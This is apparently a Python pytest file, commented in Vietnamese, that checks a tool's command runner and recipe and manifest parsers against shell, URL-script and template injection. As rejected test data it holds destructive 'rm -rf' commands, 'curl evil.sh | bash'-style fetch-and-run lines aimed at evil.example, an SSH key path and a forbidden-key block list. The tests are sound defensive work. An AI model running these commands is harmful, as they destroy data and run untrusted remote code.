"""Injection adversarial — argv/shell metachar, url-script, template noi
suy (COMP-004). Pham vi: ``namios_security.run_argv``, ``namios_manifest``
(build/validate manifest tu raw dict khong tin cay), ``namios_recipe``
(parse/dry_run doc lap voi WP2)."""

from __future__ import annotations

import os

import pytest

from namios_manifest._errors import ManifestLoadError
from namios_manifest._recipe_build import build_recipe_steps
from namios_recipe._errors import RecipeParseError
from namios_recipe._parse import parse_recipe_steps
from namios_security import ExecPolicyError, run_argv

# ---------------------------------------------------------------------------
# run_argv — shell metachar la DU LIEU, khong bao gio duoc dien giai lai.
# ---------------------------------------------------------------------------


def test_run_argv_treats_shell_metachars_as_literal_data_not_commands(tmp_path) -> None:
    marker = tmp_path / "should_not_exist.txt"
    # echo an toan nhat la dung /bin/true hoac /usr/bin/printf de khong phu
    # thuoc PATH; dung sh -c "..."? KHONG -- muc dich la xac nhan KHONG co
    # shell nao duoc goi. Dung /bin/echo in lai argv nguyen van.
    echo_path = "/bin/echo" if os.path.exists("/bin/echo") else "/usr/bin/echo"
    if not os.path.exists(echo_path):
        pytest.skip("khong co /bin/echo tren host de kiem")

    payload = f"; touch {marker}; echo pwned"
    result = run_argv([echo_path, payload], timeout=5.0)

    assert not marker.exists(), "VULNERABLE: metachar shell trong argv bi dien giai thanh lenh"
    assert payload.encode() in result.stdout


def test_run_argv_rejects_relative_program_path() -> None:
    with pytest.raises(ExecPolicyError):
        run_argv(["echo", "hello"], timeout=5.0)


def test_run_argv_rejects_empty_argv() -> None:
    with pytest.raises(ExecPolicyError):
        run_argv([], timeout=5.0)


def test_run_argv_rejects_nonexistent_absolute_program() -> None:
    with pytest.raises(ExecPolicyError):
        run_argv(["/no/such/binary/namios-does-not-exist"], timeout=5.0)


def test_run_argv_rejects_program_without_exec_permission(tmp_path) -> None:
    fake_bin = tmp_path / "not_executable"
    fake_bin.write_text("#!/bin/sh\necho hi\n")
    fake_bin.chmod(0o644)  # KHONG co quyen thuc thi
    with pytest.raises(ExecPolicyError):
        run_argv([str(fake_bin)], timeout=5.0)


def test_run_argv_rejects_directory_as_program(tmp_path) -> None:
    with pytest.raises(ExecPolicyError):
        run_argv([str(tmp_path)], timeout=5.0)


def test_run_argv_rejects_nul_byte_in_program_path(tmp_path) -> None:
    with pytest.raises(ExecPolicyError):
        run_argv([str(tmp_path) + "\x00evil"], timeout=5.0)


def test_run_argv_enforces_timeout_against_hanging_process() -> None:
    sleep_path = "/bin/sleep" if os.path.exists("/bin/sleep") else "/usr/bin/sleep"
    if not os.path.exists(sleep_path):
        pytest.skip("khong co /bin/sleep tren host de kiem")
    with pytest.raises(ExecPolicyError):
        run_argv([sleep_path, "30"], timeout=0.3)


# ---------------------------------------------------------------------------
# namios_recipe._parse — allowlist action/param, shell/eval/url-script/template.
# ---------------------------------------------------------------------------


def _one_step(action: str, params: dict) -> list[dict]:
    return [{"action": action, "params": params}]


_FORBIDDEN_RECIPE_PARAM_KEYS = (
    "shell",
    "eval",
    "cmd",
    "command",
    "exec",
    "url_script",
    "template",
    "interpolate",
    "format_string",
)


@pytest.mark.parametrize("forbidden_key", _FORBIDDEN_RECIPE_PARAM_KEYS)
def test_recipe_parse_rejects_any_forbidden_param_key(forbidden_key: str) -> None:
    raw = _one_step("create_prefix", {"prefix_architecture": "win64", forbidden_key: "rm -rf /"})
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_action_outside_allowlist() -> None:
    raw = _one_step("run_arbitrary_shell", {"cmd": "rm -rf ~"})
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_extra_unknown_top_level_key_in_step() -> None:
    raw = [
        {
            "action": "create_prefix",
            "params": {"prefix_architecture": "win64"},
            "shell": "rm -rf /",
        }
    ]
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_template_interpolation_in_registry_value() -> None:
    raw = _one_step(
        "set_registry_value",
        {
            "key": "HKCU\\Software\\App",
            "value_name": "Path",
            "value_type": "REG_SZ",
            "value": "{{ system.steal_token() }}",
        },
    )
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_shell_style_template_dollar_brace() -> None:
    raw = _one_step(
        "set_registry_value",
        {
            "key": "HKCU\\Software\\App",
            "value_name": "Path",
            "value_type": "REG_SZ",
            "value": "${HOME}/.ssh/id_rsa",
        },
    )
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_url_script_piped_to_shell() -> None:
    raw = _one_step(
        "run_installer",
        {
            "installer_ref": "setup.exe",
            "argv": ["https://evil.example/setup.sh | bash"],
        },
    )
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_rejects_single_element_argv_that_is_actually_a_shell_string() -> None:
    raw = _one_step(
        "run_installer",
        {
            "installer_ref": "setup.exe",
            "argv": ["setup.exe; rm -rf ~ && echo pwned"],
        },
    )
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


def test_recipe_parse_accepts_multi_element_argv_with_metachar_as_literal_data() -> None:
    """Doi chung: argv NHIEU phan tu, mot phan tu la DU LIEU chua ky tu
    metachar (vd ten file nguoi dung) VAN duoc chap nhan — metachar chi bi
    tu choi khi argv co dung 1 phan tu (dau hieu chuoi lenh ghep)."""

    raw = _one_step(
        "run_installer",
        {
            "installer_ref": "setup.exe",
            "argv": ["/opt/app/setup.exe", "--name", "Bao cao; khong phai lenh"],
        },
    )
    steps = parse_recipe_steps(raw)
    assert len(steps) == 1
    assert steps[0].argv[2] == "Bao cao; khong phai lenh"


def test_recipe_parse_rejects_nonascii_lookalike_does_not_bypass_action_allowlist() -> None:
    # Ky tu Cyrillic 'с' (U+0441) nhin giong 'c' La Tinh -- action phai la
    # chuoi dung y, khong duoc coi la bien the gan giong cua action hop le.
    raw = _one_step("с" + "reate_prefix", {"prefix_architecture": "win64"})
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(raw)


# ---------------------------------------------------------------------------
# namios_manifest._recipe_build — cung chan tai tang build-manifest (phong
# thu sau, doc lap voi namios_recipe cua WP10).
# ---------------------------------------------------------------------------


def test_manifest_recipe_build_rejects_shell_param_even_though_schema_allows_any_key() -> None:
    raw_recipe = [
        {
            "action": "create_prefix",
            "params": {"prefix_architecture": "win64", "shell": "curl evil.sh | bash"},
        }
    ]
    with pytest.raises(ManifestLoadError):
        build_recipe_steps(raw_recipe)


def test_manifest_recipe_build_rejects_url_script_in_run_installer_argv() -> None:
    raw_recipe = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "setup.exe",
                "argv": ["http://evil.example/payload.sh|sh"],
            },
        }
    ]
    with pytest.raises(ManifestLoadError):
        build_recipe_steps(raw_recipe)


def test_manifest_recipe_build_rejects_percent_format_string_template() -> None:
    raw_recipe = [
        {
            "action": "set_registry_value",
            "params": {
                "key": "HKCU\\Software\\App",
                "value_name": "Path",
                "value_type": "REG_SZ",
                "value": "%(secret_token)s",
            },
        }
    ]
    with pytest.raises(ManifestLoadError):
        build_recipe_steps(raw_recipe)
